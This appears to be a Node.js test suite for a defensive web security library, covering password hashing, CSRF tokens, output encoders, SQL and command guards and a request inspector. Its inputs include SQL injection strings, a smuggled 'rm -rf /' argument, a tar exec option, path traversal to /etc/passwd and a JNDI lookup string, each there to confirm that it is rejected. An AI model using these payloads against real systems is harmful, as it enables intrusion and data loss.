import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  PasswordHasher,
  HmacSigner,
  LoginAttemptLimiter,
  randomToken,
  constantTimeEquals,
  validatePassword,
  CsrfTokenService,
  securityHeaders,
  forHtml,
  forHtmlAttribute,
  forJavaScript,
  forUrlComponent,
  safeUrl,
  SafeSql,
  safeCommand,
  sanitizeForLog,
  SecurityViolationError,
  HttpRequestInspector,
} from '../src/index.js';
import { securityMiddleware, errorHandler } from '../src/express.js';

const fixtures = Object.fromEntries(
  fs
    .readFileSync(path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../test-vectors/crypto-fixtures.properties'), 'utf8')
    .split(/\r?\n/)
    .filter((l) => l && !l.startsWith('#'))
    .map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]),
);

test('password hashing round trip and Java-compatible format', async () => {
  const h = new PasswordHasher(1000);
  const stored = await h.hash('correct horse battery');
  assert.match(stored, /^pbkdf2_sha256\$1000\$/);
  assert.equal(await h.verify('correct horse battery', stored), true);
  assert.equal(await h.verify('wrong', stored), false);
  assert.equal(await h.verify('x', 'garbage'), false);
  assert.equal(await h.verify('x', 'pbkdf2_sha256$999999999$AAAA$AAAA'), false);
  assert.equal(new PasswordHasher().needsRehash(stored), true);
  // Same fixture the Java suite verifies.
  assert.equal(await h.verify(fixtures['password.plain'], fixtures['password.hash']), true);
});

test('password policy', () => {
  assert.deepEqual(validatePassword('glacier-lantern-91', { username: 'alice' }), []);
  assert.ok(validatePassword('short').length);
  assert.ok(validatePassword('password123!').length);
  assert.ok(validatePassword('alice-is-great-2026', { username: 'alice' }).length);
  assert.ok(validatePassword('aaaaaaaaaaaaaa').length);
});

test('login limiter locks and unlocks', () => {
  let now = 0;
  const l = new LoginAttemptLimiter({ maxFailures: 3, windowMs: 5 * 60_000, lockoutMs: 10 * 60_000, now: () => now });
  l.recordFailure('alice');
  l.recordFailure('alice');
  assert.equal(l.isLocked('alice'), false);
  l.recordFailure('alice');
  assert.equal(l.isLocked('alice'), true);
  assert.equal(l.retryAfterMs('alice'), 10 * 60_000);
  now += 11 * 60_000;
  assert.equal(l.isLocked('alice'), false);
});

test('login limiter: a flood of throwaway keys cannot reset a victim or block others', () => {
  let now = 0;
  const l = new LoginAttemptLimiter({ maxFailures: 3, windowMs: 5 * 60_000, lockoutMs: 10 * 60_000, maxTrackedKeys: 100, now: () => now });
  l.recordFailure('victim');
  l.recordFailure('victim'); // one attempt left before lockout
  for (let i = 0; i < 3; i++) l.recordFailure('locked'); // an active lockout
  for (let round = 0; round < 3; round++) { // cheap flood: one failure per throwaway key
    for (let i = 0; i < 1000; i++) l.recordFailure(`flood-${round}-${i}`);
    assert.ok(l.trackedKeys <= 100, `cap exceeded: ${l.trackedKeys}`);
    now += 2000;
  }
  assert.ok(l.evictionCount > 0);
  // Single-failure entries are evicted first, so the victim's two failures survive.
  l.recordFailure('victim');
  assert.equal(l.isLocked('victim'), true, 'the flood must not reset a counter that holds more failures');
  assert.equal(l.isLocked('locked'), true, 'the flood must not evict an active lockout');
  // Nobody else is blocked by the flood.
  assert.equal(l.isLocked('never-seen-account'), false);
  assert.equal(l.retryAfterMs('never-seen-account'), 0);
});

test('login limiter evicts the weakest entry, oldest first', () => {
  let now = 0;
  const l = new LoginAttemptLimiter({ maxFailures: 5, windowMs: 5 * 60_000, lockoutMs: 10 * 60_000, maxTrackedKeys: 3, now: () => now });
  l.recordFailure('a'); // 1 failure, oldest
  l.recordFailure('b'); // 1 failure
  l.recordFailure('c');
  l.recordFailure('c'); // 2 failures
  l.recordFailure('d'); // full: evicts "a", the oldest weakest entry
  for (let i = 0; i < 4; i++) l.recordFailure('c'); // reaches the lockout only if c was never evicted
  assert.equal(l.isLocked('c'), true);
  assert.equal(l.trackedKeys, 3);
  assert.equal(l.evictionCount, 1);
});

test('request inspector fails closed on nesting deeper than it inspects', () => {
  let deep = { q: "' OR 1=1--" };
  for (let i = 0; i < 15; i++) deep = { a: deep };
  const r = new HttpRequestInspector().inspect({ body: deep });
  assert.equal(r.malicious, true);
  assert.match(r.summary, /nesting-too-deep/);
  assert.equal(new HttpRequestInspector().inspect({ body: { a: { b: { c: 'hello' } } } }).malicious, false);
});

test('tokens, HMAC and CSRF', () => {
  assert.equal(randomToken().length, 43);
  assert.equal(constantTimeEquals('abc', 'abc'), true);
  assert.equal(constantTimeEquals('abc', 'abd'), false);
  const s = new HmacSigner(fixtures['hmac.key']);
  assert.equal(s.sign('hello'), fixtures['hmac.hello']);
  assert.equal(s.verify('user=42', s.sign('user=42')), true);
  assert.equal(s.verify('user=43', s.sign('user=42')), false);
  assert.throws(() => new HmacSigner('short'));
  // Webhook signature; fixture generated with openssl.
  assert.equal(s.verifyHex('{"event":"paid"}', `sha256=${fixtures['hmac.hex.paid']}`), true);
  assert.equal(s.verifyHex('{"event":"refund"}', `sha256=${fixtures['hmac.hex.paid']}`), false);

  const csrf = new CsrfTokenService(fixtures['hmac.key']);
  const t = csrf.generate('session-1');
  assert.equal(csrf.verify('session-1', t), true);
  assert.equal(csrf.verify('session-2', t), false);
  assert.equal(csrf.verify('session-1', `${t}x`), false);
  assert.equal(CsrfTokenService.requiresToken('POST'), true);
  assert.equal(CsrfTokenService.requiresToken('GET'), false);
});

test('security headers', () => {
  const h = securityHeaders({ 'X-Frame-Options': null }, { noStore: true });
  assert.equal(h['X-Content-Type-Options'], 'nosniff');
  assert.equal(h['X-Frame-Options'], undefined);
  assert.equal(h['Cache-Control'], 'no-store');
});

test('encoders match the Java output', () => {
  assert.equal(forHtml('<script>alert(1)</script>'), '&lt;script&gt;alert(1)&lt;&#x2F;script&gt;');
  assert.equal(forHtmlAttribute('a" onmouseover=x'), 'a&#x22;&#x20;onmouseover&#x3d;x');
  assert.equal(forJavaScript("'; alert(1)</script>"), '\\x27\\x3b alert\\x281\\x29\\x3c\\x2fscript\\x3e');
  assert.equal(forUrlComponent('a b&c=d'), 'a%20b%26c%3Dd');
  assert.equal(safeUrl('javascript:alert(1)'), '#');
  assert.equal(safeUrl(' Java\tScript:alert(1)'), '#');
  assert.equal(safeUrl('https://x.example/a'), 'https://x.example/a');
  assert.equal(safeUrl('/relative?a=1'), '/relative?a=1');
});

test('SafeSql and safeCommand', () => {
  assert.equal(SafeSql.allowlisted('CREATED_AT', ['created_at', 'total']), 'created_at');
  assert.throws(() => SafeSql.allowlisted('total; DROP TABLE x', ['created_at', 'total']), SecurityViolationError);
  assert.equal(SafeSql.direction('desc'), 'DESC');
  assert.equal(SafeSql.direction('1;drop'), 'ASC');
  assert.equal(SafeSql.placeholders(3), '?, ?, ?');
  assert.equal(SafeSql.placeholders(3, { style: 'pg', start: 2 }), '$2, $3, $4');
  assert.equal(SafeSql.escapeLike('100%_off\\'), '100\\%\\_off\\\\');
  assert.throws(() => SafeSql.quoteIdentifier('a"b'), SecurityViolationError);
  assert.equal(SafeSql.mapped('Created', { created: 'o.created_at' }), 'o.created_at');
  assert.throws(() => SafeSql.mapped('__proto__', { created: 'o.created_at' }), SecurityViolationError);

  assert.deepEqual(safeCommand('/usr/bin/convert', ['in.png', 'out.jpg']), ['/usr/bin/convert', ['in.png', 'out.jpg']]);
  assert.throws(() => safeCommand('/bin/sh', []), SecurityViolationError);
  assert.throws(() => safeCommand('convert', ['a;rm -rf /']), SecurityViolationError);
  assert.throws(() => safeCommand('tar', ['--checkpoint-action=exec=sh']), SecurityViolationError);
});

test('log sanitizer', () => {
  assert.equal(sanitizeForLog('user=bob\nINFO fake entry'), 'user=bob\\nINFO fake entry');
  assert.equal(sanitizeForLog('password=hunter2 next'), 'password=**** next');
  assert.equal(sanitizeForLog('Authorization: Bearer abcdefghijklmnop'), 'Authorization: Bearer ****');
  assert.equal(sanitizeForLog('{"token":"abc123"}'), '{"token":"****"}');
  assert.ok(sanitizeForLog('a'.repeat(5000)).endsWith('...[truncated]'));
});

test('request inspector covers query, nested JSON body and headers', () => {
  const inspector = new HttpRequestInspector();
  const r = inspector.inspect({ path: '/api/orders', query: { id: '1;SELECT pg_sleep(5)--' }, headers: { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' } });
  assert.equal(r.malicious, true);
  assert.match(r.summary, /^param:id=/);
  assert.ok(!r.summary.includes('pg_sleep(5)'));
  assert.equal(inspector.inspect({ path: '/api/orders/42', query: { id: '42' } }).suspicious, false);
  assert.equal(inspector.inspect({ body: { user: { filter: ["' OR 1=1--"] } } }).malicious, true);
  assert.equal(inspector.inspect({ path: '/files/..%2f..%2fetc/passwd' }).malicious, true);
  assert.equal(inspector.inspect({ headers: { 'User-Agent': '${jndi:ldap://x/a}' } }).malicious, true);
});

function fakeRes() {
  return {
    headers: {},
    statusCode: 200,
    body: undefined,
    headersSent: false,
    setHeader(k, v) { this.headers[k] = v; },
    end(b) { this.body = b; this.headersSent = true; },
  };
}
const quiet = { log() {}, info() {}, warn() {}, error() {} };

test('express middleware blocks, monitors and sets headers', () => {
  const block = securityMiddleware({ logger: quiet });
  let res = fakeRes();
  let called = false;
  block({ method: 'GET', originalUrl: '/x?id=1', query: { id: "1' OR '1'='1" }, headers: {} }, res, () => { called = true; });
  assert.equal(called, false);
  assert.equal(res.statusCode, 400);
  assert.equal(res.headers['X-Content-Type-Options'], 'nosniff');
  assert.match(res.body, /request_rejected/);

  const monitor = securityMiddleware({ mode: 'monitor', logger: quiet });
  res = fakeRes();
  monitor({ method: 'GET', originalUrl: '/x', query: { id: "1' OR '1'='1" }, headers: {} }, res, () => { called = true; });
  assert.equal(called, true);

  called = false;
  res = fakeRes();
  block({ method: 'POST', originalUrl: '/api/profile', body: { name: "O'Brien", bio: 'I like rock and roll' }, headers: {} }, res, () => { called = true; });
  assert.equal(called, true);
});

test('error handler never leaks details', () => {
  const res = fakeRes();
  errorHandler({ logger: quiet })(new Error('SELECT * FROM secret_table failed'), { method: 'GET', url: '/' }, res, () => {});
  assert.equal(res.statusCode, 500);
  assert.ok(!res.body.includes('secret_table'));
  assert.match(res.body, /incidentId/);
});
